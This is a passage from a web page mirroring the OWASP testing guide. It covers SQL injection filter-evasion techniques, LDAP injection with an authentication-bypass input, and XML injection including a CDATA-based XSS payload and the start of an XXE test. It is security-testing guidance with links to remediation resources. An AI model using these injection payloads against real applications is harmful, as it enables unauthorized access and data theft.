                <p><code class="language-plaintext highlighter-rouge">%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--</code></p>
                
                <h4 id="character-encoding">Character Encoding</h4>
                
                <p>Char() function can be used to replace English char. For example, char(114,111,111,116) means root</p>
                
                <p><code class="language-plaintext highlighter-rouge">' UNION SELECT password FROM Users WHERE name='root'--</code></p>
                
                <p>To apply the Char(), the SQL injeciton statement will be</p>
                
                <p><code class="language-plaintext highlighter-rouge">' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--</code></p>
                
                <h4 id="string-concatenation">String Concatenation</h4>
                
                <p>Concatenation breaks up SQL keywords and evades filters. Concatenation syntax varies based on database engine. Take MS SQL engine as an example</p>
                
                <p><code class="language-plaintext highlighter-rouge">select 1</code></p>
                
                <p>The simple SQL statement can be changed as below by using concatenation</p>
                
                <p><code class="language-plaintext highlighter-rouge">EXEC('SEL' + 'ECT 1')</code></p>
                
                <h4 id="hex-encoding">Hex Encoding</h4>
                
                <p>Hex encoding technique uses Hexadecimal encoding to replace original SQL statement char. For example, <code class="language-plaintext highlighter-rouge">root</code> can be represented as <code class="language-plaintext highlighter-rouge">726F6F74</code></p>
                
                <p><code class="language-plaintext highlighter-rouge">Select user from users where name = 'root'</code></p>
                
                <p>The SQL statement by using HEX value will be:</p>
                
                <p><code class="language-plaintext highlighter-rouge">Select user from users where name = 726F6F74</code></p>
                
                <p>or</p>
                
                <p><code class="language-plaintext highlighter-rouge">Select user from users where name = unhex('726F6F74')</code></p>
                
                <h4 id="declare-variables">Declare Variables</h4>
                
                <p>Declare the SQL injection statement into variable and execute it.</p>
                
                <p>For example, SQL injection statement below</p>
                
                <p><code class="language-plaintext highlighter-rouge">Union Select password</code></p>
                
                <p>Define the SQL statement into variable <code class="language-plaintext highlighter-rouge">SQLivar</code></p>
                
                <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span> <span class="k">declare</span> <span class="o"></span><span class="n">SQLivar</span> <span class="n">nvarchar</span><span class="p">(</span><span class="mi">80</span><span class="p">);</span> <span class="k">set</span> <span class="o"></span><span class="n">myvar</span> <span class="o">=</span> <span class="n">N</span><span class="s1">'UNI'</span> <span class="o">+</span> <span class="n">N</span><span class="s1">'ON'</span> <span class="o">+</span> <span class="n">N</span><span class="s1">' SELECT'</span> <span class="o">+</span> <span class="n">N</span><span class="s1">'password'</span><span class="p">);</span>
                <span class="k">EXEC</span><span class="p">(</span><span class="o"></span><span class="n">SQLivar</span><span class="p">)</span>
                </code></pre></div></div>
                
                <h4 id="alternative-expression-of-or-1--1">Alternative Expression of ‘or 1 = 1’</h4>
                
                <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">OR</span> <span class="s1">'SQLi'</span> <span class="o">=</span> <span class="s1">'SQL'</span><span class="o">+</span><span class="s1">'i'</span>
                <span class="k">OR</span> <span class="s1">'SQLi'</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="s1">'S'</span>
                <span class="k">or</span> <span class="mi">20</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">1</span>
                <span class="k">OR</span> <span class="mi">2</span> <span class="k">between</span> <span class="mi">3</span> <span class="k">and</span> <span class="mi">1</span>
                <span class="k">OR</span> <span class="s1">'SQLi'</span> <span class="o">=</span> <span class="n">N</span><span class="s1">'SQLi'</span>
                <span class="mi">1</span> <span class="k">and</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">1</span>
                <span class="mi">1</span> <span class="o">||</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">1</span>
                <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">1</span>
                </code></pre></div></div>
                
                <h2 id="remediation">Remediation</h2>
                
                <ul>
                  <li>To secure the application from SQL injection vulnerabilities, refer to the <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">SQL Injection Prevention CheatSheet</a>.</li>
                  <li>To secure the SQL server, refer to the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html">Database Security CheatSheet</a>.</li>
                </ul>
                
                <p>For generic input validation security, refer to the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html">Input Validation CheatSheet</a>.</p>
                
                <h2 id="tools">Tools</h2>
                
                <ul>
                  <li><a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection">SQL Injection Fuzz Strings (from wfuzz tool) - Fuzzdb</a></li>
                  <li><a href="http://packetstormsecurity.org/files/43795/sqlbftools-1.2.tar.gz.html">sqlbftools</a></li>
                  <li><a href="http://sqlmap.org/">Bernardo Damele A. G.: sqlmap, automatic SQL injection tool</a></li>
                  <li><a href="https://github.com/dtrip/mysqloit">Muhaimin Dzulfakar: MySqloit, MySql Injection takeover tool</a></li>
                </ul>
                
                <h2 id="references">References</h2>
                
                <ul>
                  <li><a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017-A1-Injection</a></li>
                  <li><a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL Injection</a></li>
                </ul>
                
                <p>Technology specific Testing Guide pages have been created for the following DBMSs:</p>
                
                <ul>
                  <li><a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle">Oracle</a></li>
                  <li><a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL">MySQL</a></li>
                  <li><a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server">SQL Server</a></li>
                  <li><a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL">PostgreSQL</a></li>
                  <li><a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access">MS Access</a></li>
                  <li><a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection">NoSQL</a></li>
                  <li><a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection">ORM</a></li>
                  <li><a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side">Client-side</a></li>
                </ul>
                
                <h3 id="whitepapers">Whitepapers</h3>
                
                <ul>
                  <li><a href="http://cs.unh.edu/~it666/reading_list/Web/advanced_sql_injection.pdf">Victor Chapela: “Advanced SQL Injection”</a></li>
                  <li><a href="https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf">Chris Anley: “More Advanced SQL Injection”</a></li>
                  <li><a href="https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf">David Litchfield: “Data-mining with SQL Injection and Inference”</a></li>
                  <li><a href="https://www.imperva.com/lg/lgw.asp?pid=369">Imperva: “Blinded SQL Injection”</a></li>
                  <li><a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/">Ferruh Mavituna: “SQL Injection Cheat Sheet”</a></li>
                  <li><a href="https://docs.google.com/file/d/0B5CQOTY4YRQCSWRHNkNaaFMyQTA/edit">Kevin Spett from SPI Dynamics: “SQL Injection”</a></li>
                  <li><a href="https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Blind_SQLInjection.pdf">Kevin Spett from SPI Dynamics: “Blind SQL Injection”</a></li>
                  <li><a href="https://www.exploit-db.com/papers/17934/">“ZeQ3uL” (Prathan Phongthiproek) and “Suphot Boonchamnan”: “Beyond SQLi: Obfuscate and Bypass”</a></li>
                  <li><a href="https://blog.checkpoint.com/2015/05/07/latest-sql-injection-trends/">Adi Kaploun and Eliran Goshen, Check Point Threat Intelligence &amp; Research Team: “The Latest SQL Injection Trends”</a></li>
                </ul>
                
                <h3 id="documentation-on-sql-injection-vulnerabilities-in-products">Documentation on SQL Injection Vulnerabilities in Products</h3>
                
                <ul>
                  <li><a href="https://www.vanstechelman.eu/content/anatomy-of-the-sql-injection-in-drupals-database-comment-filtering-system-sa-core-2015-003">Anatomy of the SQL injection in Drupal’s database comment filtering system SA-CORE-2015-003</a></li>
                </ul>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv6Modal" tabindex="-1" role="dialog" aria-labelledby="inpv6ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv6ModalLabel">WSTG-INPV-06 - Testing for LDAP Injection</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                    <h2 id="summary">Summary</h2>
                    
                    <p>The Lightweight Directory Access Protocol (LDAP) is used to store information about users, hosts, and many other objects. <a href="https://wiki.owasp.org/index.php/LDAP_injection">LDAP injection</a> is a server-side attack, which could allow sensitive information about users and hosts represented in an LDAP structure to be disclosed, modified, or inserted. This is done by manipulating input parameters afterwards passed to internal search, add, and modify functions.</p>
                    
                    <p>A web application could use LDAP in order to let users authenticate or search other users’ information inside a corporate structure. The goal of LDAP injection attacks is to inject LDAP search filters metacharacters in a query which will be executed by the application.</p>
                    
                    <p><a href="https://www.ietf.org/rfc/rfc2254.txt">Rfc2254</a> defines a grammar on how to build a search filter on LDAPv3 and extends <a href="https://www.ietf.org/rfc/rfc1960.txt">Rfc1960</a> (LDAPv2).</p>
                    
                    <p>An LDAP search filter is constructed in Polish notation, also known as <a href="https://en.wikipedia.org/wiki/Polish_notation">Polish notation prefix notation</a>.</p>
                    
                    <p>This means that a pseudo code condition on a search filter like this:</p>
                    
                    <p><code class="language-plaintext highlighter-rouge">find("cn=John &amp; userPassword=mypass")</code></p>
                    
                    <p>will be represented as:</p>
                    
                    <p><code class="language-plaintext highlighter-rouge">find("(&amp;(cn=John)(userPassword=mypass))")</code></p>
                    
                    <p>Boolean conditions and group aggregations on an LDAP search filter could be applied by using the following metacharacters:</p>
                    
                    <table>
                      <thead>
                        <tr>
                          <th>Metachar</th>
                          <th>Meaning</th>
                        </tr>
                      </thead>
                      <tbody>
                        <tr>
                          <td>&amp;</td>
                          <td>Boolean AND</td>
                        </tr>
                        <tr>
                          <td>|</td>
                          <td>Boolean OR</td>
                        </tr>
                        <tr>
                          <td>!</td>
                          <td>Boolean NOT</td>
                        </tr>
                        <tr>
                          <td>=</td>
                          <td>Equals</td>
                        </tr>
                        <tr>
                          <td>~=</td>
                          <td>Approx</td>
                        </tr>
                        <tr>
                          <td>&gt;=</td>
                          <td>Greater than</td>
                        </tr>
                        <tr>
                          <td>&lt;=</td>
                          <td>Less than</td>
                        </tr>
                        <tr>
                          <td>*</td>
                          <td>Any character</td>
                        </tr>
                        <tr>
                          <td>()</td>
                          <td>Grouping parenthesis</td>
                        </tr>
                      </tbody>
                    </table>
                    
                    <p>More complete examples on how to build a search filter can be found in the related RFC.</p>
                    
                    <p>A successful exploitation of an LDAP injection vulnerability could allow the tester to:</p>
                    
                    <ul>
                      <li>Access unauthorized content</li>
                      <li>Evade application restrictions</li>
                      <li>Gather unauthorized informations</li>
                      <li>Add or modify Objects inside LDAP tree structure.</li>
                    </ul>
                    
                    <h2 id="test-objectives">Test Objectives</h2>
                    
                    <ul>
                      <li>Identify LDAP injection points.</li>
                      <li>Assess the severity of the injection.</li>
                    </ul>
                    
                    <h2 id="how-to-test">How to Test</h2>
                    
                    <h3 id="example-1-search-filters">Example 1: Search Filters</h3>
                    
                    <p>Let’s suppose we have a web application using a search filter like the following one:</p>
                    
                    <p><code class="language-plaintext highlighter-rouge">searchfilter="(cn="+user+")"</code></p>
                    
                    <p>which is instantiated by an HTTP request like this:</p>
                    
                    <p><code class="language-plaintext highlighter-rouge">http://www.example.com/ldapsearch?user=John</code></p>
                    
                    <p>If the value <code class="language-plaintext highlighter-rouge">John</code> is replaced with a <code class="language-plaintext highlighter-rouge">*</code>, by sending the request:</p>
                    
                    <p><code class="language-plaintext highlighter-rouge">http://www.example.com/ldapsearch?user=*</code></p>
                    
                    <p>the filter will look like:</p>
                    
                    <p><code class="language-plaintext highlighter-rouge">searchfilter="(cn=*)"</code></p>
                    
                    <p>which matches every object with a ‘cn’ attribute equals to anything.</p>
                    
                    <p>If the application is vulnerable to LDAP injection, it will display some or all of the user’s attributes, depending on the application’s execution flow and the permissions of the LDAP connected user.</p>
                    
                    <p>A tester could use a trial-and-error approach, by inserting in the parameter <code class="language-plaintext highlighter-rouge">(</code>, <code class="language-plaintext highlighter-rouge">|</code>, <code class="language-plaintext highlighter-rouge">&amp;</code>, <code class="language-plaintext highlighter-rouge">*</code> and the other characters, in order to check the application for errors.</p>
                    
                    <h3 id="example-2-login">Example 2: Login</h3>
                    
                    <p>If a web application uses LDAP to check user credentials during the login process and it is vulnerable to LDAP injection, it is possible to bypass the authentication check by injecting an always true LDAP query (in a similar way to SQL and XPATH injection ).</p>
                    
                    <p>Let’s suppose a web application uses a filter to match LDAP user/password pair.</p>
                    
                    <p><code class="language-plaintext highlighter-rouge">searchlogin= "(&amp;(uid="+user+")(userPassword={MD5}"+base64(pack("H*",md5(pass)))+"))";</code></p>
                    
                    <p>By using the following values:</p>
                    
                    <pre><code class="language-txt">user=*)(uid=*))(|(uid=*
                    pass=password
                    </code></pre>
                    
                    <p>the search filter will results in:</p>
                    
                    <p><code class="language-plaintext highlighter-rouge">searchlogin="(&amp;(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))";</code></p>
                    
                    <p>which is correct and always true. This way, the tester will gain logged-in status as the first user in LDAP tree.</p>
                    
                    <h2 id="tools">Tools</h2>
                    
                    <ul>
                      <li><a href="https://www.ldapadministrator.com">Softerra LDAP Browser</a></li>
                    </ul>
                    
                    <h2 id="references">References</h2>
                    
                    <ul>
                      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html">LDAP Injection Prevention Cheat Sheet</a></li>
                    </ul>
                    
                    <h3 id="whitepapers">Whitepapers</h3>
                    
                    <ul>
                      <li><a href="http://www.networkdls.com/articles/ldapinjection.pdf">Sacha Faust: LDAP Injection: Are Your Applications Vulnerable?</a></li>
                      <li><a href="https://www.redbooks.ibm.com/redbooks/pdfs/sg244986.pdf">IBM paper: Understanding LDAP</a></li>
                      <li><a href="https://www.ietf.org/rfc/rfc1960.txt">RFC 1960: A String Representation of LDAP Search Filters</a></li>
                      <li><a href="https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf">LDAP injection</a></li>
                    </ul>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv7Modal" tabindex="-1" role="dialog" aria-labelledby="inpv7ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv7ModalLabel">WSTG-INPV-07 - Testing for XML Injection</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>XML Injection testing is when a tester tries to inject an XML doc to the application. If the XML parser fails to contextually validate data, then the test will yield a positive result.</p>
                
                <p>This section describes practical examples of XML Injection. First, an XML style communication will be defined and its working principles explained. Then, the discovery method in which we try to insert XML metacharacters. Once the first step is accomplished, the tester will have some information about the XML structure, so it will be possible to try to inject XML data and tags (Tag Injection).</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify XML injection points.</li>
                  <li>Assess the types of exploits that can be attained and their severities.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>Let’s suppose there is a web application using an XML style communication in order to perform user registration. This is done by creating and adding a new <code class="language-plaintext highlighter-rouge">user&gt;</code>node in an <code class="language-plaintext highlighter-rouge">xmlDb</code> file.</p>
                
                <p>Let’s suppose the xmlDB file is like the following:</p>
                
                <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
                <span class="nt">&lt;users&gt;</span>
                    <span class="nt">&lt;user&gt;</span>
                        <span class="nt">&lt;username&gt;</span>gandalf<span class="nt">&lt;/username&gt;</span>
                        <span class="nt">&lt;password&gt;</span>!c3<span class="nt">&lt;/password&gt;</span>
                        <span class="nt">&lt;userid&gt;</span>0<span class="nt">&lt;/userid&gt;</span>
                        <span class="nt">&lt;mail&gt;</span>gandalf@middleearth.com<span class="nt">&lt;/mail&gt;</span>
                    <span class="nt">&lt;/user&gt;</span>
                    <span class="nt">&lt;user&gt;</span>
                        <span class="nt">&lt;username&gt;</span>Stefan0<span class="nt">&lt;/username&gt;</span>
                        <span class="nt">&lt;password&gt;</span>w1s3c<span class="nt">&lt;/password&gt;</span>
                        <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
                        <span class="nt">&lt;mail&gt;</span>Stefan0@whysec.hmm<span class="nt">&lt;/mail&gt;</span>
                    <span class="nt">&lt;/user&gt;</span>
                <span class="nt">&lt;/users&gt;</span>
                </code></pre></div></div>
                
                <p>When a user registers himself by filling an HTML form, the application receives the user’s data in a standard request, which, for the sake of simplicity, will be supposed to be sent as a <code class="language-plaintext highlighter-rouge">GET</code> request.</p>
                
                <p>For example, the following values:</p>
                
                <pre><code class="language-txt">Username: tony
                Password: Un6R34kb!e
                E-mail: s4tan@hell.com
                </code></pre>
                
                <p>will produce the request:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/addUser.php?username=tony&amp;password=Un6R34kb!e&amp;email=s4tan@hell.com</code></p>
                
                <p>The application, then, builds the following node:</p>
                
                <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user&gt;</span>
                    <span class="nt">&lt;username&gt;</span>tony<span class="nt">&lt;/username&gt;</span>
                    <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span>
                    <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
                    <span class="nt">&lt;mail&gt;</span>s4tan@hell.com<span class="nt">&lt;/mail&gt;</span>
                <span class="nt">&lt;/user&gt;</span>
                </code></pre></div></div>
                
                <p>which will be added to the xmlDB:</p>
                
                <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
                <span class="nt">&lt;users&gt;</span>
                    <span class="nt">&lt;user&gt;</span>
                        <span class="nt">&lt;username&gt;</span>gandalf<span class="nt">&lt;/username&gt;</span>
                        <span class="nt">&lt;password&gt;</span>!c3<span class="nt">&lt;/password&gt;</span>
                        <span class="nt">&lt;userid&gt;</span>0<span class="nt">&lt;/userid&gt;</span>
                        <span class="nt">&lt;mail&gt;</span>gandalf@middleearth.com<span class="nt">&lt;/mail&gt;</span>
                    <span class="nt">&lt;/user&gt;</span>
                    <span class="nt">&lt;user&gt;</span>
                        <span class="nt">&lt;username&gt;</span>Stefan0<span class="nt">&lt;/username&gt;</span>
                        <span class="nt">&lt;password&gt;</span>w1s3c<span class="nt">&lt;/password&gt;</span>
                        <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
                        <span class="nt">&lt;mail&gt;</span>Stefan0@whysec.hmm<span class="nt">&lt;/mail&gt;</span>
                    <span class="nt">&lt;/user&gt;</span>
                    <span class="nt">&lt;user&gt;</span>
                    <span class="nt">&lt;username&gt;</span>tony<span class="nt">&lt;/username&gt;</span>
                    <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span>
                    <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
                    <span class="nt">&lt;mail&gt;</span>s4tan@hell.com<span class="nt">&lt;/mail&gt;</span>
                    <span class="nt">&lt;/user&gt;</span>
                <span class="nt">&lt;/users&gt;</span>
                </code></pre></div></div>
                
                <h3 id="discovery">Discovery</h3>
                
                <p>The first step in order to test an application for the presence of a XML Injection vulnerability consists of trying to insert XML metacharacters.</p>
                
                <p>XML metacharacters are:</p>
                
                <ul>
                  <li>Single quote: <code class="language-plaintext highlighter-rouge">'</code> - When not sanitized, this character could throw an exception during XML parsing, if the injected value is going to be part of an attribute value in a tag.</li>
                </ul>
                
                <p>As an example, let’s suppose there is the following attribute:</p>
                
                <p><code class="language-plaintext highlighter-rouge">&lt;node attrib='$inputValue'/&gt;</code></p>
                
                <p>So, if:</p>
                
                <p><code class="language-plaintext highlighter-rouge">inputValue = foo'</code></p>
                
                <p>is instantiated and then is inserted as the attrib value:</p>
                
                <p><code class="language-plaintext highlighter-rouge">&lt;node attrib='foo''/&gt;</code></p>
                
                <p>then, the resulting XML document is not well formed.</p>
                
                <ul>
                  <li>Double quote: <code class="language-plaintext highlighter-rouge">"</code> - this character has the same meaning as single quote and it could be used if the attribute value is enclosed in double quotes.</li>
                </ul>
                
                <p><code class="language-plaintext highlighter-rouge">&lt;node attrib="$inputValue"/&gt;</code></p>
                
                <p>So if:</p>
                
                <p><code class="language-plaintext highlighter-rouge">$inputValue = foo"</code></p>
                
                <p>the substitution gives:</p>
                
                <p><code class="language-plaintext highlighter-rouge">&lt;node attrib="foo""/&gt;</code></p>
                
                <p>and the resulting XML document is invalid.</p>
                
                <ul>
                  <li>Angular parentheses: <code class="language-plaintext highlighter-rouge">&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;</code> - By adding an open or closed angular parenthesis in a user input like the following:</li>
                </ul>
                
                <p><code class="language-plaintext highlighter-rouge">Username = foo&lt;</code></p>
                
                <p>the application will build a new node:</p>
                
                <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user&gt;</span>
                    <span class="nt">&lt;username&gt;</span>foo<span class="err">&lt;</span><span class="nt">&lt;/username&gt;</span>
                    <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span>
                    <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
                    <span class="nt">&lt;mail&gt;</span>s4tan@hell.com<span class="nt">&lt;/mail&gt;</span>
                <span class="nt">&lt;/user&gt;</span>
                </code></pre></div></div>
                
                <p>but, because of the presence of the open ‘&lt;’, the resulting XML document is invalid.</p>
                
                <ul>
                  <li>Comment tag: <code class="language-plaintext highlighter-rouge">&lt;!--/--&gt;</code> - This sequence of characters is interpreted as the beginning/end of a comment. So by injecting one of them in Username parameter:</li>
                </ul>
                
                <p><code class="language-plaintext highlighter-rouge">Username = foo&lt;!--</code></p>
                
                <p>the application will build a node like the following:</p>
                
                <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user&gt;</span>
                    <span class="nt">&lt;username&gt;</span>foo<span class="c">&lt;!--&lt;/username&gt;
                    &lt;password&gt;Un6R34kb!e&lt;/password&gt;
                    &lt;userid&gt;500&lt;/userid&gt;
                    &lt;mail&gt;s4tan@hell.com&lt;/mail&gt;
                &lt;/user&gt;
                </span></code></pre></div></div>
                
                <p>which won’t be a valid XML sequence.</p>
                
                <ul>
                  <li>Ampersand: <code class="language-plaintext highlighter-rouge">&amp;</code>- The ampersand is used in the XML syntax to represent entities. The format of an entity is <code class="language-plaintext highlighter-rouge">&amp;symbol;</code>. An entity is mapped to a character in the Unicode character set.</li>
                </ul>
                
                <p>For example:</p>
                
                <p><code class="language-plaintext highlighter-rouge">&lt;tagnode&gt;&amp;lt;&lt;/tagnode&gt;</code></p>
                
                <p>is well formed and valid, and represents the <code class="language-plaintext highlighter-rouge">&lt;</code> ASCII character.</p>
                
                <p>If <code class="language-plaintext highlighter-rouge">&amp;</code> is not encoded itself with <code class="language-plaintext highlighter-rouge">&amp;amp;</code>, it could be used to test XML injection.</p>
                
                <p>In fact, if an input like the following is provided:</p>
                
                <p><code class="language-plaintext highlighter-rouge">Username = &amp;foo</code></p>
                
                <p>a new node will be created:</p>
                
                <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user&gt;</span>
                    <span class="nt">&lt;username&gt;</span><span class="err">&amp;</span>foo<span class="nt">&lt;/username&gt;</span>
                    <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span>
                    <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
                    <span class="nt">&lt;mail&gt;</span>s4tan@hell.com<span class="nt">&lt;/mail&gt;</span>
                <span class="nt">&lt;/user&gt;</span>
                </code></pre></div></div>
                
                <p>but, again, the document is not valid: <code class="language-plaintext highlighter-rouge">&amp;foo</code> is not terminated with <code class="language-plaintext highlighter-rouge">;</code> and the <code class="language-plaintext highlighter-rouge">&amp;foo;</code> entity is undefined.</p>
                
                <ul>
                  <li>CDATA section delimiters: <code class="language-plaintext highlighter-rouge">&lt;!\[CDATA\[ / ]]&gt;</code> - CDATA sections are used to escape blocks of text containing characters which would otherwise be recognized as markup. In other words, characters enclosed in a CDATA section are not parsed by an XML parser.</li>
                </ul>
                
                <p>For example, if there is the need to represent the string <code class="language-plaintext highlighter-rouge">&lt;foo&gt;</code> inside a text node, a CDATA section may be used:</p>
                
                <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;node&gt;</span>
                    <span class="cp">&lt;![CDATA[&lt;foo&gt;]]&gt;</span>
                <span class="nt">&lt;/node&gt;</span>
                </code></pre></div></div>
                
                <p>so that <code class="language-plaintext highlighter-rouge">&lt;foo&gt;</code> won’t be parsed as markup and will be considered as character data.</p>
                
                <p>If a node is created in the following way:</p>
                
                <p><code class="language-plaintext highlighter-rouge">&lt;username&gt;&lt;![CDATA[&lt;$userName]]&gt;&lt;/username&gt;</code></p>
                
                <p>the tester could try to inject the end CDATA string <code class="language-plaintext highlighter-rouge">]]&gt;</code> in order to try to invalidate the XML document.</p>
                
                <p><code class="language-plaintext highlighter-rouge">userName = ]]&gt;</code></p>
                
                <p>this will become:</p>
                
                <p><code class="language-plaintext highlighter-rouge">&lt;username&gt;&lt;![CDATA[]]&gt;]]&gt;&lt;/username&gt;</code></p>
                
                <p>which is not a valid XML fragment.</p>
                
                <p>Another test is related to CDATA tag. Suppose that the XML document is processed to generate an HTML page. In this case, the CDATA section delimiters may be simply eliminated, without further inspecting their contents. Then, it is possible to inject HTML tags, which will be included in the generated page, completely bypassing existing sanitization routines.</p>
                
                <p>Let’s consider a concrete example. Suppose we have a node containing some text that will be displayed back to the user.</p>
                
                <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
                    $HTMLCode
                <span class="nt">&lt;/html&gt;</span>
                </code></pre></div></div>
                
                <p>Then, an attacker can provide the following input:</p>
                
                <p><code class="language-plaintext highlighter-rouge">$HTMLCode = &lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert('xss')&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;</code></p>
                
                <p>and obtain the following node:</p>
                
                <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
                    <span class="cp">&lt;![CDATA[&lt;]]&gt;</span>script<span class="cp">&lt;![CDATA[&gt;]]&gt;</span>alert('xss')<span class="cp">&lt;![CDATA[&lt;]]&gt;</span>/script<span class="cp">&lt;![CDATA[&gt;]]&gt;</span>
                <span class="nt">&lt;/html&gt;</span>
                </code></pre></div></div>
                
                <p>During the processing, the CDATA section delimiters are eliminated, generating the following HTML code:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
                    <span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">)</span>
                <span class="nt">&lt;/script&gt;</span>
                </code></pre></div></div>
                
                <p>The result is that the application is vulnerable to XSS.</p>
                
                <p>External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.</p>
                
                <p>To test for XXE vulnerabilities, one can use the following input:</p>
                
                <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
                    <span class="cp">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span>
